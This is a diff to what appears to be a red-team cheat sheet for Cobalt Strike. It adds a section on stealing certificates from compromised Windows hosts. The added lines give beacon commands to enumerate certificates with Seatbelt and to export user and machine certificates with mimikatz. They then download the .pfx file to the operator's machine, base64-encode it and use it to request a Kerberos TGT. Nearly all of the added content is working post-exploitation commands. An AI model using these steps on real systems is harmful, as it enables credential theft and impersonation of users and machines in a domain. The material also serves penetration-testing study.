@@ -59,6 +59,44 @@ beacon> mimikatz sekurlsa::ekeys
 
 We are interested in `aes256_hmac` and `aes128_hmac` if is available. It will be used during **Overpass-The-Hash** technique.
 
+# Certificates
+
+To enumerate certificates use `Seatbelt`.
+
+```
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
+```
+
+> **Note**: Ensure that the certificate is **used for authentication**.
+
+We can dump certificates with mimikatz.
+
+* For users:
+
+```
+beacon> mimikatz crypto::certificates /export
+```
+
+* For machines:
+
+```
+beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
+```
+
+Download the file and sync files from cobalt strike to your local machine.
+
+```
+beacon> download C:\Users\user\CURRENT_USER_My_0_User Example.pfx
+```
+
+> **Note** : Go to `View -> Downloads` to sync files.
+
+Encode in base64 the `.pfx` file.
+
+```
+cat CURRENT_USER_My_0_User\ Example.pfx | base64 -w0
+```
+And finally use it to request a TGT.
 
 # Security Account Manager
 
